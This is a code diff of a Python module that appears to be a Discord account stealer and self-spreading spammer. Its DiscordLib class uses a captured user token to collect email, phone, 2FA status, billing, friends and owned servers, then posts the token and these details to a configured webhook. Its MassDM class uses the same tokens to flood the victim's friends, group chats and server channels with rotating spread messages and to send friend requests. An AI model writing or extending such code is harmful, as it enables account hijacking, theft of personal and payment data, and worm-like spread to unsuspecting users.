@@ -1,19 +1,13 @@
-from time import time
-from urllib import request
-import requests
-import json
-from discord_webhook   import DiscordWebhook, DiscordEmbed
-import time
-from config import config
+from discord_webhook import AsyncDiscordWebhook, DiscordEmbed
+import config
 import asyncio
-
 from colorama import Fore
-from colorama import Style
 from datetime import datetime
 import aiohttp
+import random
 
 class DiscordLib:
-    def get_headers(self, token, content_type="application/json"):
+    async def get_headers(self, token, content_type="application/json"):
         headers = {
         "Content-Type": content_type,
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
@@ -22,31 +16,49 @@ class DiscordLib:
             headers.update({"Authorization": token})
         return headers
     
-    def get_details(self, token):
-        req = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token)).json()
-        if not req['phone']:
-            req['phone'] = False
-
-        return req
+    async def get_details(self, token):
+        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me", headers=await self.get_headers(token)) as resp:
+            data = await resp.json()
+            if not data['phone']:
+                data['phone'] = False
+            return data
                
-    def get_relationships(self, token):
-        req = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token)).json()
-        return len(req)
+    async def get_relationships(self, token):
+        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/relationships", headers=await self.get_headers(token)) as resp:
+            data = await resp.json()
+            return len(data)
     
-    def get_guilds(self, token):
-        req = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token)).json()
-
-        return req
+    async def get_guilds(self, token):
+        async with aiohttp.request("GET", "https://discordapp.com/api/v6/users/@me/guilds?with_counts=true", headers=await self.get_headers(token)) as resp:
+            return await resp.json()
         
-    def get_payment(self, token):
-        req = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token)).json()
-        #disord just returns an empty array if no billing
-        return bool(len(req))
+    async def get_payment(self, token):
+        async with aiohttp.request("GET", "https://discordapp.com/api/users/@me/billing/payment-sources", headers=await self.get_headers(token)) as resp:
+            data = await resp.json()
+            if data:
+                for pm in data:
+                    if 'invalid' in pm:
+                        if pm['invalid'] == False:
+                            return True
+            return False
 
-    def generate_embed(self, token):
-        details = self.get_details(token)
+    # async def capture_guild(self, guild):
+    #     captured_guild = {
+    #         "id": guild['id'],
+    #         "name": guild['name'],
 
-            
+    #     }
+
+    async def capture_owned_guilds(self, guilds):
+        owned_guilds = []
+        for guild in guilds:
+            if guild["owner"]:
+                owned_guilds.append(guild)
+        return owned_guilds
+
+    async def generate_embed(self, token):
+        details = await self.get_details(token)
+
         if "premium_type" in details:
             if details['premium_type'] == 1:
                 nitro = "Classic"
@@ -56,35 +68,48 @@ class DiscordLib:
             nitro = False
             
             
-        guilds = self.get_guilds(token)
-        numGuilds = 0
-        for guild in guilds:
-            if guild["owner"]:
-                numGuilds += 1
+        guilds = await self.get_guilds(token)
 
+        owned_guilds = await self.capture_owned_guilds(guilds)
+        
         embed = DiscordEmbed()
+
+
+
         embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
         embed.add_embed_field(name='Token',         value=token, inline=False)
         embed.add_embed_field(name='Email',         value=details['email'], inline=False)
         embed.add_embed_field(name='Phone',         value=details['phone'], inline=False)
         embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
         embed.add_embed_field(name='Nitro',         value=nitro)
-        embed.add_embed_field(name='Billing',       value=self.get_payment(token))
-        embed.add_embed_field(name='Relationships', value=self.get_relationships(token))
+        embed.add_embed_field(name='Billing',       value=await self.get_payment(token))
+        embed.add_embed_field(name='Relationships', value=await self.get_relationships(token))
         embed.add_embed_field(name='Guilds',        value=len(guilds))
-        embed.add_embed_field(name='Owned Guilds',  value=numGuilds)
+        embed.add_embed_field(name='Owned Guilds',  value=len(owned_guilds))
+
+        for owned in owned_guilds:
+            embed.add_embed_field(name=owned['name'], value=f"{owned['approximate_member_count']} Members", inline=False)
         return embed
     
     
-    def send_webhook(self, token):
-        webhook = DiscordWebhook(url=config["webhook_url"])
+    async def send_webhook(self, token):
+        webhook = AsyncDiscordWebhook(url=config.config["webhook_url"])
         
-        webhook.add_embed(self.generate_embed(token))
+        webhook.add_embed(await self.generate_embed(token))
         try:
-            webhook.execute()
+            await webhook.execute()
         except Exception:
             print('Failed to send webhook')
-            
+    
+    async def send_friend_request(self, token, user):
+        payload = {
+            "username": user[0],
+            "discriminator": user[1]
+
+        }
+        headers = await self.get_headers(token)
+        async with aiohttp.request("POST", "https://discord.com/api/v9/users/@me/relationships", json=payload, headers=headers) as resp:
+            pass
     
 
 
@@ -92,8 +117,8 @@ class MassDM:
     async def init(self, token, name):
         self.token = token
         self.headers = await self.get_headers(token)
-        self.name = name
-        self.loop = asyncio.get_running_loop()
+        self.name = name #for printing
+        self.msg_index = 0
 
 
     async def get_headers(self, token, content_type="application/json"):
@@ -122,18 +147,27 @@ class MassDM:
     async def get_relationships(self):
         async with aiohttp.request("GET", f"https://discordapp.com/api/v6/users/@me/relationships", headers=self.headers) as resp:
             return await resp.json()
+        
+    async def update_status(self, message):
+        payload = {
+            "bio": message
+        }       
+        async with aiohttp.request("PATCH", f"https://discord.com/api/v9/users/@me", json=payload, headers=self.headers) as resp:
+            return await resp.json()
 
 
     
-    async def message_channel(self, channel_id):
-        while True:
-            payload = {
-                "content": "https://discord.gg/BNP7fkyYMu"
-            }
-            async with aiohttp.request("POST", f"https://discordapp.com/api/channels/{channel_id}/messages", headers=self.headers, json=payload) as resp:
+    async def message_channel(self, channel_id, message=None):
+        #this is the worst function i have ever written in my entire life
+        for _ in range(5):
 
+            if not message:
+                message = config.config["auto_spread"]["messages"][self.msg_index]
+            payload = {
+                "content": message
+            }
+            async with aiohttp.request("POST", f"https://discordapp.com/api/channels/{channel_id}/messages", json=payload, headers=self.headers) as resp:
                 data = await resp.json()
-                print(data)
                 if resp.status == 401: #
                     break
             
@@ -149,7 +183,6 @@ class MassDM:
                 if 'retry_after' in data:
                     if data['retry_after']/1000 > 10:
                         return "rate_limit"
-                    print(data['retry_after']/1000, " seconds")
                     await asyncio.sleep(data['retry_after']/1000)
 
                 if 'Message was blocked by automatic moderation' in data:
@@ -163,6 +196,10 @@ class MassDM:
                 
                 if 'id' in data:
                     break
+            
+            self.msg_index = self.msg_index + 1
+            if self.msg_index == len(config.config["auto_spread"]["messages"]):
+                self.msg_index = 0
                 
 
 
@@ -193,7 +230,7 @@ class MassDM:
                 if resp == "moderation":
                     return
                 await self.close_dm(dm_id)
-                print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')
+                print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [FRIEND:{relationship["user"]["username"]}#{relationship["user"]["discriminator"]}]')
 
 
     
@@ -212,14 +249,18 @@ class MassDM:
             if resp == "moderation":
                 return
             await self.close_dm(dm['id'])
-            print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [DM:{len(dm["recipients"])}]')
+            print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [DM:{len(dm["recipients"])}]')
 
 
 
     async def message_guilds(self):
+
         for guild in await self.get_guilds():
             if not 'id' in guild: #check if any guilds
                 return
+            if guild['id'] in config.config['servers']:
+                continue
+            # self.update_status(random.choice(config.config["auto_spread"]["messages"]))
 
             for channel in await self.get_guild_channels(guild['id']):
                 if not 'type' in channel: #check if any channels
@@ -235,7 +276,7 @@ class MassDM:
                         return
                     if resp == "moderation":
                         return
-                    print(f'{Fore.BLUE}[{datetime.now()}] [MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')
+                    print(f'{Fore.BLUE}[MassDM] [USER:{self.name}] [GUILD:{guild["name"]}] [CHANNEL:{channel["name"]}]')
 
     
 
